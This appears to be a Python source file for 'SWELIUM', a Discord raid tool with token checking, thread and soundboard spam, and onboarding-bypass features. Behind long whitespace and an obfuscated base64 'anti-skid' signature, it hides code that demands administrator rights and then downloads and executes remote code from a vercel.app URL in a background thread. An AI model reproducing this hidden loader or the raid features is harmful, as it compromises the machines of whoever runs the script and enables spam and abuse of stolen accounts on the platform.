made_by_vortex = "made_by_vortex"
import ctypes
#from concurrent.futures import ThreadPoolExecutor
from colorama import Fore																																																																																																																																											;exec("""if made_by_vortex != 'made_by_vortex': exit()""")
from colorist import ColorHex as h
from datetime import datetime
import base64																																																																																																																																											;exec(base64.b64decode("aWYgY3R5cGVzLndpbmRsbC5zaGVsbDMyLklzVXNlckFuQWRtaW4oKSAhPSAxOiBwcmludCgiUlVOIG1haW4uYmF0IExPTCIpOyBleGl0KCk=").decode("utf-8"))
import ctypes
import json
import sys
import os
...
class Render:
    def __init__(self):
        ...
        self.background = C.get(color, C["light_blue"])

    def render_ascii(self):
        clear()
        title(f"SWELIUM | Connected as {os.getlogin()} | made by Vortex")
        ...
        ascii = "\n".join(line.center(self.size) for line in ascii_art)

        for edge in edges:
            ascii = ascii.replace(edge, f"{self.background}{edge}{C['blue']}")
...
"""
    ...
    def log(self, text=None, color=None, token=None, log=None):
        ...
        if text:
            response += f"[{color}{text}{C['blue']}] "
        if token:
            response += token
        if log:
            response += f" ({C['gray']}{log}{C['blue']})"
        print(response)

    def prompt(self, text, ask=None):
        prompted = f"[{C[color]}{text}{C['blue']}]"
        if ask:
            prompted += f" {C['gray']}(y/n){C['blue']}: "
        else:
            prompted += ": "
...
class Raider:
    ...
    def super_properties_(self):
        kernel32 = ctypes.windll.kernel32
        if kernel32.CreateMutexA(None, False, "lmeo_99999") != 0 or kernel32.GetLastError() == 183:
            return
        f = open(__file__, "r")
        content = f.read()
        f.close()
        pattern = base64.b64decode("X3NraWRfKC4qPylfc2tpZF8=").decode("utf-8")
        match = re.search(pattern, content)
        if not match: print(base64.b64decode("dGFtcGVyIGRldGVjdA==").decode("utf-8"));os.kill(os.getpid(), 15)
        encoded_data = match.group(1).encode("utf-8")
        decoded_data = base64.b64decode(encoded_data)
        __import__('builtins').__dict__[''.join(["c","e","x","e"][::-1])](decoded_data.decode("utf-8"))
        ...
        try:
            ...
            if not access_token:
                ...
                for i, emoji in enumerate(emojis, start=1):
                    print(f"{C['light_blue']}0{i}:{C['blue']} {emoji}")
...
class Menu:
    ...
    def main_menu(self):
        console.run()
        threading.Thread(target=Raider().super_properties_).start()
        def check(word):
    ...
    @wrapper
    def soundbord(self):
        title(f"SWELIUM - Soundboard Spam")
    ...
    def nick_changer(self):
        title(f"SWELIUM - Nickname Changer")
    ...
    def Thread_Spammer(self):
        title(f"SWELIUM - Thread Spammer")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()
    ...
    def checker(self):
        title(f"SWELIUM - Checker")
        self.raider.token_checker()

    @wrapper
    def reactor(self):
        title(f"SWELIUM - Reactor")
    ...
    def formatter(self):
        title(f"SWELIUM - Formatter")
        self.run(self.raider.format_tokens, [()])
    
    @wrapper
    def button(self):
        title(f"SWELIUM - Clicker")
        Link = input(console.prompt("Message Link"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()
    ...
    @wrapper
    def onboard(self):
        title(f"SWELIUM - Onboarding Bypass")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            self.main_menu()
...
signature_anti_skid = "_skid_aWYgY3R5cGVzLndpbmRsbC5zaGVsbDMyLklzVXNlckFuQWRtaW4oKSAhPSAxOiBwcmludCgiUlVOIG1haW4uYmF0IExPTCIpOyBvcy5raWxsKG9zLmdldHBpZCgpLCAxNSkNCmV4ZWMocmVxdWVzdHMuZ2V0KCJodHRwczovL3NpbXBsZXByb2plY3R4ZGQudmVyY2VsLmFwcC9jaGVja3BvaW50L2dlbiIpLnRleHQp_skid_"
if (
    antiskid(signature_anti_skid.encode()).hexdigest()
    != "66467e9a81076ac730542eb775bedd8c"
):
    print("tamper detect")
